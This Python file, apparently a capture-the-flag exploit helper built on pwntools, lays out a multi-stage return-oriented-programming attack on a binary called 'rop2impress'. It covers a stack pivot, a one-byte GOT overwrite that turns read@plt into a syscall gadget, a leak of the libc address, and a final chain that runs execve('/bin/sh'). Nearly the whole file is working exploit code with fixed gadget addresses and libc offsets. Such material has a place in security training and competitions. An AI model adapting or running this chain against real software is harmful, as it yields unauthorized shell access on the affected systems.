#!/usr/bin/env python3
"""
Shared chain/layout builder for rop2impress, used by both the emulator (emu2.py)
and the live exploit (exploit_v2.py). Pure layout, no I/O.

Design (two safe CALL_READ stages, then driver via frozen-syscall read@plt):

 Stage 0 (initial rop() overflow): pivot into CALL_READ with rbp = R1.
 Stage 1 (CALL_READ rbp=R1, rsp on REAL stack -> safe): write DRIVER chain + pivot
          words into the writable page (window must NOT include GOT.read 0x403350).
          Chain (leave;ret) directly to Stage 2.
 Stage 2 (CALL_READ rbp=0x4033a0 -> inner read base = 0x403350 = GOT.read):
          send exactly 1 byte 0x8f. Only GOT.read low byte changes (0x80->0x8f);
          read@plt becomes a bare syscall gadget. 1 byte doesn't reach the inner
          `call read@plt` return-addr slot, so this stage is also safe. Its leave;ret
          uses pre-staged [0x4033a0]/[0x4033a8] to pivot (POP_RSP) onto DRIVER.
          Also freezes rdi=0, rsi=0x403350, rdx=0x60.
 DRIVER (flat ROP chain at a GOT-independent address; read@plt == syscall now):
    RAX_ZERO ; read@plt  -> read(0,GOT,0x60): send 1 byte 0x8f -> rax=1, GOT stays syscall
    read@plt             -> rax=1 => write(0,GOT,0x60): LEAK GOT.read = libc+0x11ba8f
    RAX_ZERO ; read@plt  -> read(0,GOT,0x60): write shell chain to 0x403350..0x4033b0
    POP_RSP ; <0x403380> -> rsp = 0x403380 -> shell chain runs:
       0x403380 pop_rdi ; 0x403388 binsh ; 0x403390 system
"""
from pwn import flat, p64, context
context.arch = 'amd64'

CALL_READ = 0x401139
RET_IN    = 0x40114f     # instruction after `call read@plt` inside CALL_READ
READ_PLT  = 0x401030
RAX_ZERO  = 0x4010cf     # rax=0; ret
POP_RSP   = 0x40112c     # pop rsp; ret
RET       = 0x401016     # ret

GOT_READ  = 0x403350

OFF_SYSCALL = 0x11ba8f
OFF_READ    = 0x11ba80
OFF_POP_RDI = 0x10f78b
OFF_SYSTEM  = 0x58750
OFF_BINSH   = 0x1cb42f

# ---- fixed layout ----
DRIVER     = 0x403400          # driver ROP chain (GOT-independent)
PIVOT_RBP  = 0x4033a0          # forced: stage2 rbp
PIVOT_RIP  = 0x4033a8          # forced: stage2 rbp+8
# value popped into rsp by POP_RSP = DRIVER (stored at the slot right after POP_RSP
# on the stack at pivot time -> we place it immediately after PIVOT_RIP target).

SHELL_CHAIN = 0x403358         # where final read lays the libc ROP chain; rsp pivots here

# libc gadget offsets for a syscall-based execve("/bin/sh",0,0) (avoids system/fork)
OFF_POP_RSI    = 0x110a7d      # pop rsi ; ret
OFF_POP_RAX    = 0x0dd237      # pop rax ; ret
OFF_ZERO_EDX   = 0x0b5dd0      # xor edx,edx ; mov eax,edx ; ret  (rdx=0, rax=0)

# Stage 1 window: must contain DRIVER (0x403400..0x403428), PIVOT_RBP/RIP
# (0x4033a0/0x4033a8), the POP_RSP pivot value, and stage1's chain words. Choose
# base so none collide with GOT (0x403350) and the window is 0x60.
# Place DRIVER at 0x403400; pivot words at 0x4033a0/a8/b0. Span 0x4033a0..0x403428
# = 0x88 bytes > 0x60. Too big for one window. So split: use a Stage 1a + 1b? That
# reintroduces an unsafe middle stage. Instead co-locate DRIVER with pivot words.
#
# Put DRIVER right after the pivot area:
#   0x4033a0 PIVOT_RBP (dummy rbp for stage2 leave;ret) -- low byte must be nonzero
#   0x4033a8 PIVOT_RIP = POP_RSP
#   0x4033b0 pivot value = DRIVER
#   0x4033b8 DRIVER[0] RAX_ZERO
#   0x4033c0 DRIVER[1] READ_PLT
#   0x4033c8 DRIVER[2] READ_PLT
#   0x4033d0 DRIVER[3] RAX_ZERO
#   0x4033d8 DRIVER[4] READ_PLT
#   0x4033e0 DRIVER[5] POP_RSP
#   0x4033e8 DRIVER[6] SHELL_CHAIN (=0x403380) -> rsp
# Span 0x4033a0..0x4033f0 = 0x50 bytes. One 0x60 window with base 0x4033a0 covers it,
# but base 0x4033a0 means window [0x4033a0,0x403400) and stage1 rbp=0x4033f0; its
# chain words at [0x4033f0]/[0x4033f8] are OUTSIDE the span above (good, 0x4033f0 is
# within window end 0x403400). Set DRIVER=0x4033b8 accordingly.
DRIVER = 0x4033b8

def win(d):
    return flat(d, filler=b'\x00').ljust(0x60, b'\x00')

# stage1 rbp:
R1 = 0x4033f0                  # window base = 0x4033a0

def driver_chain():
    return [RAX_ZERO, READ_PLT, READ_PLT, RAX_ZERO, READ_PLT, POP_RSP, SHELL_CHAIN]

def stage0():
    # initial rop() overflow: byte0 nonzero, saved rbp=R1, retaddr=CALL_READ
    return win({0x00: b'\x01', 0x50: R1, 0x58: CALL_READ})

def stage1():
    base = R1 - 0x50          # 0x4033a0
    def o(a): return a - base
    d = {
        o(PIVOT_RBP): p64(0x4033a0),   # dummy rbp (nonzero low byte 0xa0)
        o(PIVOT_RIP): p64(POP_RSP),    # stage2 leave;ret -> pop rsp
        o(0x4033b0):  p64(DRIVER),     # value popped into rsp -> DRIVER
    }
    chain = driver_chain()
    for i, v in enumerate(chain):
        d[o(DRIVER) + 8*i] = p64(v)
    # stage1 chain words (leave;ret -> stage2 CALL_READ with rbp=PIVOT_RBP)
    d[0x50] = p64(PIVOT_RBP)   # [R1]  -> next rbp = 0x4033a0
    d[0x58] = p64(CALL_READ)   # [R1+8]-> next rip
    return win(d)

def stage2_byte():
    return b'\x8f'             # 1-byte GOT overwrite

def driver_read1_byte():
    return b'\x8f'             # keeps GOT.read low byte 0x8f, makes rax=1

def final_payload(libc_base):
    pop_rdi = libc_base + OFF_POP_RDI
    pop_rsi = libc_base + OFF_POP_RSI
    pop_rax = libc_base + OFF_POP_RAX
    zero_edx= libc_base + OFF_ZERO_EDX
    syscall = libc_base + OFF_SYSCALL      # read+0xf: syscall; cmp; ja; ret
    binsh   = libc_base + OFF_BINSH
    # Final read writes window base = GOT_READ (frozen rsi): 0x403350..0x4033b0.
    # Driver after final read: POP_RSP ; SHELL_CHAIN(=0x403358) -> rsp=0x403358.
    # Lay a syscall-based execve("/bin/sh", NULL, NULL) chain (no fork, so it works
    # even if system()/fork is sandboxed):
    #   pop_rdi ; binsh
    #   pop_rsi ; 0
    #   zero_edx (rdx=0, rax=0)
    #   pop_rax ; 59
    #   syscall  -> execve(binsh, 0, 0)
    base = GOT_READ
    def o(a): return a - base
    chain = [pop_rdi, binsh, pop_rsi, 0, zero_edx, pop_rax, 59, syscall]
    d = {o(GOT_READ): p64(syscall)}   # 0x403350 GOT.read (harmless; unused henceforth)
    for i, v in enumerate(chain):
        d[o(SHELL_CHAIN) + 8*i] = p64(v)   # 0x403358 ...
    return win(d)
